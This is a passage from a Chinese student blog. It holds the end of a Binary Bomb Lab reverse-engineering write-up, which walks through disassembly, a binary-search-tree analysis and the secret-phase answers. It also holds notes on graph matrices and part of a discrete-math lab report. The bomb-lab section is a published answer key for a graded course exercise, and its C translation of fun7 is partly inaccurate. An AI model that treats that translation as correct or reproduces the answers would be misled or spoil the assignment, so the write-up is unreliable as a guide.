class="line"> 8049308:	75 6f                	jne    8049379 &lt;phase_defused+0x89&gt;</span><br><span class="line"> 804930a:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804930d:	8d 45 a4             	lea    -0x5c(%ebp),%eax</span><br><span class="line"> 8049310:	50                   	push   %eax</span><br><span class="line"> 8049311:	8d 45 a0             	lea    -0x60(%ebp),%eax</span><br><span class="line"> 8049314:	50                   	push   %eax</span><br><span class="line"> 8049315:	8d 45 9c             	lea    -0x64(%ebp),%eax</span><br><span class="line"> 8049318:	50                   	push   %eax</span><br><span class="line"> 8049319:	68 49 a3 04 08       	push   $0x804a349</span><br><span class="line"> 804931e:	68 d0 c4 04 08       	push   $0x804c4d0</span><br><span class="line"> 8049323:	e8 e8 f4 ff ff       	call   8048810 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"> 8049328:	83 c4 20             	add    $0x20,%esp</span><br><span class="line"> 804932b:	83 f8 03             	cmp    $0x3,%eax</span><br><span class="line"> 804932e:	75 39                	jne    8049369 &lt;phase_defused+0x79&gt;</span><br><span class="line"> 8049330:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8049333:	68 52 a3 04 08       	push   $0x804a352</span><br><span class="line"> 8049338:	8d 45 a4             	lea    -0x5c(%ebp),%eax</span><br><span class="line"> 804933b:	50                   	push   %eax</span><br><span class="line"> 804933c:	e8 47 fd ff ff       	call   8049088 &lt;strings_not_equal&gt;</span><br><span class="line"> 8049341:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8049344:	85 c0                	test   %eax,%eax</span><br><span class="line"> 8049346:	75 21                	jne    8049369 &lt;phase_defused+0x79&gt;</span><br><span class="line"> 8049348:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804934b:	68 18 a2 04 08       	push   $0x804a218</span><br><span class="line"> 8049350:	e8 6b f4 ff ff       	call   80487c0 &lt;puts@plt&gt;</span><br><span class="line"> 8049355:	c7 04 24 40 a2 04 08 	movl   $0x804a240,(%esp)</span><br><span class="line"> 804935c:	e8 5f f4 ff ff       	call   80487c0 &lt;puts@plt&gt;</span><br><span class="line"> 8049361:	e8 20 fc ff ff       	call   8048f86 &lt;secret_phase&gt;</span><br><span class="line"> 8049366:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8049369:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804936c:	68 78 a2 04 08       	push   $0x804a278</span><br><span class="line"> 8049371:	e8 4a f4 ff ff       	call   80487c0 &lt;puts@plt&gt;</span><br><span class="line"> 8049376:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8049379:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 804937c:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax</span><br><span class="line"> 8049383:	74 05                	je     804938a &lt;phase_defused+0x9a&gt;</span><br><span class="line"> 8049385:	e8 06 f4 ff ff       	call   8048790 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 804938a:	c9                   	leave  </span><br><span class="line"> 804938b:	c3                   	ret </span><br></pre></td></tr></table></figure>
<p>我们注意到在召唤<code>secret_phase</code>前，它先调用了<code>&lt;strings_not_equal&gt;</code>函数，对比了两个字符串，样本字符串在<code>0x804a352</code>里，</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200041168.png" alt="image-20211220004126575"></p>
<p>好的我们要找东西和它比较，找什么东西呢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8049319:	68 49 a3 04 08       	push   $0x804a349</span><br><span class="line">804931e:	68 d0 c4 04 08       	push   $0x804c4d0</span><br><span class="line">8049323:	e8 e8 f4 ff ff       	call   8048810 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure>
<p>看到调用<code>scanf</code>前<code>push</code>了2个参数进来，分别是<code>0x804a349</code>和<code>0x804c4d0</code></p>
<p>分别查看一下</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200044967.png" alt="image-20211220004424863"></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200046518.png" alt="image-20211220004601121"></p>
<p><code>0x804a349</code>是格式，两个整型一个字符串，输入格式为两个整型的只有<code>phase_4</code>和<code>phase_5</code>，可能在这两个中任一个</p>
<p><code>0x804c4d0</code>应该是输入的字符串的内容，但是现在未输入数据所以显示为空，我们先把断点设在<code>phase_5</code>看下是不是在<code>phase_4</code>处产生了输入</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200049830.png" alt="image-20211220004945496"></p>
<p>果然，它接收到了<code>phase_4</code>的数据，这证明，我们只要把<code>phase_4</code>的输入改为<code>14 7 DrEvil</code>就可进入<code>secret_phase</code></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200052050.png" alt="image-20211220005202140" style="zoom:80%;" /></p>
<p>于是我们召唤出了<code>secret_phase</code></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200052187.png" alt="image-20211220005249654" style="zoom:80%;" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">08048f86 &lt;secret_phase&gt;:</span><br><span class="line"> 8048f86:	55                   	push   %ebp</span><br><span class="line"> 8048f87:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048f89:	53                   	push   %ebx</span><br><span class="line"> 8048f8a:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line"> 8048f8d:	e8 5b 02 00 00       	call   80491ed &lt;read_line&gt;</span><br><span class="line"> 8048f92:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line"> 8048f95:	6a 0a                	push   $0xa</span><br><span class="line"> 8048f97:	6a 00                	push   $0x0</span><br><span class="line"> 8048f99:	50                   	push   %eax</span><br><span class="line"> 8048f9a:	e8 e1 f8 ff ff       	call   8048880 &lt;strtol@plt&gt;</span><br><span class="line"> 8048f9f:	89 c3                	mov    %eax,%ebx</span><br><span class="line"> 8048fa1:	8d 40 ff             	lea    -0x1(%eax),%eax</span><br><span class="line"> 8048fa4:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048fa7:	3d e8 03 00 00       	cmp    $0x3e8,%eax</span><br><span class="line"> 8048fac:	76 05                	jbe    8048fb3 &lt;secret_phase+0x2d&gt;</span><br><span class="line"> 8048fae:	e8 d8 01 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048fb3:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048fb6:	53                   	push   %ebx</span><br><span class="line"> 8048fb7:	68 88 c0 04 08       	push   $0x804c088</span><br><span class="line"> 8048fbc:	e8 73 ff ff ff       	call   8048f34 &lt;fun7&gt;</span><br><span class="line"> 8048fc1:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048fc4:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line"> 8048fc7:	74 05                	je     8048fce &lt;secret_phase+0x48&gt;</span><br><span class="line"> 8048fc9:	e8 bd 01 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048fce:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048fd1:	68 3c a1 04 08       	push   $0x804a13c</span><br><span class="line"> 8048fd6:	e8 e5 f7 ff ff       	call   80487c0 &lt;puts@plt&gt;</span><br><span class="line"> 8048fdb:	e8 10 03 00 00       	call   80492f0 &lt;phase_defused&gt;</span><br><span class="line"> 8048fe0:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048fe3:	8b 5d fc             	mov    -0x4(%ebp),%ebx</span><br><span class="line"> 8048fe6:	c9                   	leave  </span><br><span class="line"> 8048fe7:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>如果我们把断点设在<code>secret_phase</code>，我们运行后发现与其他<code>phase</code>不同的是，它并没有在一开始就要求我们进行输入，而是在<code>&lt;read_line&gt;</code>后才让我们输入，那么就是让我们输入一行数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">8048f8d:	e8 5b 02 00 00       	call   80491ed &lt;read_line&gt;</span><br><span class="line">8048f92:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line">8048f95:	6a 0a                	push   $0xa</span><br><span class="line">8048f97:	6a 00                	push   $0x0</span><br><span class="line">8048f99:	50                   	push   %eax</span><br><span class="line">8048f9a:	e8 e1 f8 ff ff       	call   8048880 &lt;strtol@plt&gt;</span><br></pre></td></tr></table></figure>
<p>在读入一行后接着调用了<code>&lt;strtol@plt&gt;</code>，这个函数的作用是把读进来的字符串转化成整数</p>
<p>例如我输入<code>&quot;15&quot;</code>，调用之后<code>eax = 15</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">8048f9f:	89 c3                	mov    %eax,%ebx</span><br><span class="line">8048fa1:	8d 40 ff             	lea    -0x1(%eax),%eax</span><br><span class="line">8048fa4:	83 c4 10             	add    $0x10,%esp</span><br><span class="line">8048fa7:	3d e8 03 00 00       	cmp    $0x3e8,%eax</span><br><span class="line">8048fac:	76 05                	jbe    8048fb3 &lt;secret_phase+0x2d&gt;</span><br><span class="line">8048fae:	e8 d8 01 00 00       	call   804918b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>接着把<code>%eax</code>给<code>%ebx</code>，再将<code>%eax</code>自减，要求自减后的<code>%eax &lt;= 0x3e8</code>，就是要我们输入的数据<code>&lt;= 1001</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">8048fb3:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line">8048fb6:	53                   	push   %ebx</span><br><span class="line">8048fb7:	68 88 c0 04 08       	push   $0x804c088</span><br><span class="line">8048fbc:	e8 73 ff ff ff       	call   8048f34 &lt;fun7&gt;</span><br><span class="line">8048fc1:	83 c4 10             	add    $0x10,%esp</span><br><span class="line">8048fc4:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">8048fc7:	74 05                	je     8048fce &lt;secret_phase+0x48&gt;</span><br><span class="line">8048fc9:	e8 bd 01 00 00       	call   804918b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>然后把我们的输入<code>%ebx</code>和<code>0x804c088</code>一起压入栈中，检查发现，<code>0x804c088</code>是一个叫<code>n1</code>的节点，可能又是什么新的数据结构</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200900218.png" alt="image-20211220090042698"></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200901946.png" alt="image-20211220090146104" style="zoom:80%;" /></p>
<p>进一步查看发现不得了，这个节点第一列是自身数据的大小，第二列是<code>n21</code>的地址，第三列是<code>n22</code>的地址，那么这很有可能是一棵二叉树，第二列是左子树的地址，第三列是右子树的地址，我们顺藤摸瓜，完整的输出这棵二叉树</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200917163.png" alt="image-20211220091703777" style="zoom:80%;" /></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200917027.jpg" alt="img" style="zoom: 50%;" /></p>
<p><em>给我画的图打个分，低于60你就可以走了</em></p>
<p>我们现在知道了<code>secret_phase</code>里的数据结构是一颗<strong>二叉搜索树</strong>，但是这题怎么解我们还是一筹莫展，关键是这个<code>&lt;fun7&gt;</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">08048f34 &lt;fun7&gt;:</span><br><span class="line"> 8048f34:	55                   	push   %ebp</span><br><span class="line"> 8048f35:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048f37:	53                   	push   %ebx</span><br><span class="line"> 8048f38:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line"> 8048f3b:	8b 55 08             	mov    0x8(%ebp),%edx</span><br><span class="line"> 8048f3e:	8b 4d 0c             	mov    0xc(%ebp),%ecx</span><br><span class="line"> 8048f41:	85 d2                	test   %edx,%edx</span><br><span class="line"> 8048f43:	74 37                	je     8048f7c &lt;fun7+0x48&gt;</span><br><span class="line"> 8048f45:	8b 1a                	mov    (%edx),%ebx</span><br><span class="line"> 8048f47:	39 cb                	cmp    %ecx,%ebx</span><br><span class="line"> 8048f49:	7e 13                	jle    8048f5e &lt;fun7+0x2a&gt;</span><br><span class="line"> 8048f4b:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048f4e:	51                   	push   %ecx</span><br><span class="line"> 8048f4f:	ff 72 04             	pushl  0x4(%edx)</span><br><span class="line"> 8048f52:	e8 dd ff ff ff       	call   8048f34 &lt;fun7&gt;</span><br><span class="line"> 8048f57:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048f5a:	01 c0                	add    %eax,%eax</span><br><span class="line"> 8048f5c:	eb 23                	jmp    8048f81 &lt;fun7+0x4d&gt;</span><br><span class="line"> 8048f5e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line"> 8048f63:	39 cb                	cmp    %ecx,%ebx</span><br><span class="line"> 8048f65:	74 1a                	je     8048f81 &lt;fun7+0x4d&gt;</span><br><span class="line"> 8048f67:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048f6a:	51                   	push   %ecx</span><br><span class="line"> 8048f6b:	ff 72 08             	pushl  0x8(%edx)</span><br><span class="line"> 8048f6e:	e8 c1 ff ff ff       	call   8048f34 &lt;fun7&gt;</span><br><span class="line"> 8048f73:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048f76:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax</span><br><span class="line"> 8048f7a:	eb 05                	jmp    8048f81 &lt;fun7+0x4d&gt;</span><br><span class="line"> 8048f7c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax</span><br><span class="line"> 8048f81:	8b 5d fc             	mov    -0x4(%ebp),%ebx</span><br><span class="line"> 8048f84:	c9                   	leave  </span><br><span class="line"> 8048f85:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p>照例看汇编看不出结果，我们翻译成高级语言</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ecx = ebx = input, edx = &amp;node esp = &amp;input</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun7</span><span class="params">(<span class="keyword">int</span>* edx, <span class="keyword">int</span> ecx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(edx &amp; edx)&#123;</span><br><span class="line">        eax = <span class="number">0xffffffff</span>;</span><br><span class="line">        ebx = ebp - <span class="number">0x4</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ebx = *edx;</span><br><span class="line">    <span class="keyword">if</span>(ebx &lt;= ecx)&#123;</span><br><span class="line">        eax = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(ebx == ecx)&#123;</span><br><span class="line">            ebx = ebp - <span class="number">0x4</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        esp -= <span class="number">0x8</span>;</span><br><span class="line">        <span class="built_in">fun7</span>(edx<span class="number">-0x8</span>, ecx);</span><br><span class="line">        esp += <span class="number">0x10</span>;</span><br><span class="line">        eax = eax*<span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        ebx = ebp - <span class="number">0x4</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    esp -= <span class="number">0x8</span>;</span><br><span class="line">    <span class="built_in">fun7</span>(edx+<span class="number">0x4</span>, ecx);</span><br><span class="line">    esp += <span class="number">0x10</span>;</span><br><span class="line">    eax *= <span class="number">2</span>;</span><br><span class="line">    ebx = ebp - <span class="number">0x4</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>又是一个递归调用的函数，这里面<code>ecx</code>一直储存的是我们的输入值，<code>edx</code>则是变换的节点地址，读入后将<code>edx</code>地址里的数据给<code>ebx</code>，二者比大小</p>
<ul>
<li>如果<code>ebx &lt; ecx</code>，节点向右子树移动</li>
<li>如果<code>ebx = ecx</code>，停止递归</li>
<li>如果<code>ebx &gt; ecx</code>，节点向左子树移动</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8048fc1:	83 c4 10             	add    $0x10,%esp</span><br><span class="line">8048fc4:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">8048fc7:	74 05                	je     8048fce &lt;secret_phase+0x48&gt;</span><br><span class="line">8048fc9:	e8 bd 01 00 00       	call   804918b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>我们回去看<code>secret_phase</code>里之后的内容，要求我们的<code>%eax</code>值为<code>0x5</code>，调用<code>&lt;fun7&gt;</code>前<code>%eax</code>为<code>0</code>，那么我们观察<code>eax</code>在<code>&lt;fun7&gt;</code>中的变化即可，注意到有两个地方有对<code>eax</code>的修改</p>
<ul>
<li>如果<code>ebx &lt; ecx</code>，<code>eax = eax*2 + 1</code></li>
<li>如果<code>ebx &gt; ecx</code>，<code>eax *= 2</code></li>
</ul>
<p>也就是说节点向右子树移动，<code>eax = eax*2 + 1</code>，向左子树移动，<code>eax *= 2</code>，这样我们就可以计算出每一个节点对应的调用<code>&lt;fun7&gt;</code>后的<code>eax</code>值</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112201044069.jpg" alt="img" style="zoom:50%;" /></p>
<p>这样就能很清晰的发现，当我们的输入为<code>n46</code>的值<code>47</code>时，最后的<code>eax</code>结果为<code>0x5</code>，因此我们最终找到了<code>secret_phase</code>的答案！！！</p>
<p><code>47</code></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112201046543.png" alt="image-20211220104633341"></p>
<p>至此，<code>Binary Bomb Lab</code>7个<code>phase</code>全部解完</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/15/%E5%9B%BE%E7%9A%84%E7%9F%A9%E9%98%B5%E8%A1%A8%E7%A4%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Existo">
      <meta itemprop="description" content="Hello Nerd">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Existo's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/15/%E5%9B%BE%E7%9A%84%E7%9F%A9%E9%98%B5%E8%A1%A8%E7%A4%BA/" class="post-title-link" itemprop="url">图的矩阵表示</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-12-15 13:37:03" itemprop="dateCreated datePublished" datetime="2021-12-15T13:37:03+08:00">2021-12-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-12-22 11:05:36" itemprop="dateModified" datetime="2021-12-22T11:05:36+08:00">2021-12-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="图的矩阵表示"><a href="#图的矩阵表示" class="headerlink" title="图的矩阵表示"></a>图的矩阵表示</h1><h2 id="关联矩阵-M-D-M-G"><a href="#关联矩阵-M-D-M-G" class="headerlink" title="关联矩阵 M(D) M(G)"></a>关联矩阵 M(D) M(G)</h2><h3 id="有向图的关联矩阵"><a href="#有向图的关联矩阵" class="headerlink" title="有向图的关联矩阵"></a>有向图的关联矩阵</h3><p>无环有向图$D=<V,E>, V={v1,v2,…,vp},E={e1,e2,…,eq}$</p>
<p>$p×q$ 阶矩阵$M(D)=(m_{ij}) _{p×q}$,其中</p>
<p>$m_{ij} = \begin{cases}<br>1 &amp; \text{若vi是ej的起点}\\<br>-1 &amp; \text{若vi是ej的终点}\\<br>0 &amp; \text{若vi不关联ej}<br>\end{cases}$</p>
<p>称M(D)为G的<strong>关联矩阵</strong></p>
<h3 id="无向图的关联矩阵"><a href="#无向图的关联矩阵" class="headerlink" title="无向图的关联矩阵"></a>无向图的关联矩阵</h3><p>无环无向图$G=<V,E>,V={v1,v2,…,vp},E={e1,e2,…,eq}$</p>
<p>则矩阵$M(G)=[m_{ij}] _{p×q}$,其中</p>
<p>$m_{ij} = \begin{cases}<br>1 &amp; \text{若vi关联ej}\\<br>0 &amp; \text{若vi不关联ej}\\<br>\end{cases}$</p>
<p>称M(G)为<strong>关联矩阵</strong></p>
<h3 id="无向图基本关联矩阵的秩"><a href="#无向图基本关联矩阵的秩" class="headerlink" title="无向图基本关联矩阵的秩"></a>无向图基本关联矩阵的秩</h3><p>定理：$G$ 连通 ⇒ $r(M_f(G))=n-1$</p>
<p>推论1：$G$ 有 $p$ 个连通分支 ⇒ $r(M_f(G))=n-p$</p>
<p>推论2：$G$ 连通 ⇔ $r(M(G))=r(M_f(G))=n-1$</p>
<h3 id="用关联矩阵求所有生成树"><a href="#用关联矩阵求所有生成树" class="headerlink" title="用关联矩阵求所有生成树"></a>用关联矩阵求所有生成树</h3><ul>
<li>忽略环, 求关联矩阵 $M$</li>
<li>任选参考点, 求基本关联矩阵 $M_f$</li>
<li>求 $M_f$ 中的所有 $n-1$ 阶子方阵,计算行列式,行列式的值<strong>模2非0</strong>的是生成树</li>
</ul>
<h2 id="邻接矩阵-A-D-A-G"><a href="#邻接矩阵-A-D-A-G" class="headerlink" title="邻接矩阵 A(D) A(G)"></a>邻接矩阵 A(D) A(G)</h2><h2 id="可达矩阵-P-D-P-G"><a href="#可达矩阵-P-D-P-G" class="headerlink" title="可达矩阵 P(D) P(G)"></a>可达矩阵 P(D) P(G)</h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/15/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E5%AE%9E%E9%AA%8C%E4%B8%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Existo">
      <meta itemprop="description" content="Hello Nerd">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Existo's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/15/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E5%AE%9E%E9%AA%8C%E4%B8%80/" class="post-title-link" itemprop="url">离散数学实验一</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-12-15 13:33:03 / 修改时间：13:34:05" itemprop="dateCreated datePublished" datetime="2021-12-15T13:33:03+08:00">2021-12-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="离散数学-II-实验一（实验报告）"><a href="#离散数学-II-实验一（实验报告）" class="headerlink" title="离散数学 II 实验一（实验报告）"></a>离散数学 II 实验一（实验报告）</h1><p>20020007095-叶鹏</p>
<p>盛艳秀-老师</p>
<h2 id="实验题目"><a href="#实验题目" class="headerlink" title="实验题目"></a>实验题目</h2><p>可简单图化、连通图、欧拉图和哈密顿图的判断</p>
<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ol>
<li>掌握可简单图化的定义及判断方法；</li>
<li>掌握连通图、欧拉图的判断方法；</li>
<li>掌握欧拉回路的搜索方法；</li>
<li>了解欧拉图的实际应用。</li>
</ol>
<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ol>
<li>给定一非负整数序列（例如：(4,2,2,2,2)）。</li>
<li>判断此非负整数序列是否是可图化的，是否是可简单图化的。</li>
<li>如果是可简单图化的，根据 Havel 定理过程求出对应的简单图，并输出此图。</li>
<li>判断此简单图是否是连通的。</li>
<li>如果是连通图，判断此图是否是欧拉图。如果是欧拉图，请输出一条欧拉回路（输出形式如：v2-&gt;v1-&gt;v5-&gt;v3-&gt;v4-&gt;v5-&gt;v2）。<br>*说明：要求学生设计的程序不仅对给定非负整数序列得出正确结果，还要对教师测试数据集得出正确结果。</li>
</ol>
<h2 id="实验内容和实验步骤"><a href="#实验内容和实验步骤" class="headerlink" title="实验内容和实验步骤"></a>实验内容和实验步骤</h2><ol>
<li>考虑到要读入度数序列，每个节点有相应的索引值，因此定义一个结构体 <em>node</em> 来储存对应内容</li>
</ol>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132109991.png" alt="image-20211213200627796" style="zoom:50%;" /></p>
<ol>
<li>所有函数，成员皆在类内定义，因此创建 <em>solution</em> 类</li>
</ol>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132109972.png" alt="image-20211213200830276" style="zoom:50%;" /></p>
<ol>
<li><em>main</em> 函数中实例化类，读入并初始化度数序列</li>
</ol>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132109370.png" alt="image-20211213200945729" style="zoom:50%;" /></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132128152.png" alt="image-20211213211727191" style="zoom: 80%;" /></p>
<ol>
<li>判断此度数列是否可图化、可简单图化，如果度数和为基数，则不可图化，也不能简单图化。如果可图化，继续判断是否可简单图化，先判断最大度是否小于等于n-1，不满足则不可简单图化，</li>
</ol>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132110568.png" alt="image-20211213201252178" style="zoom:50%;" /></p>
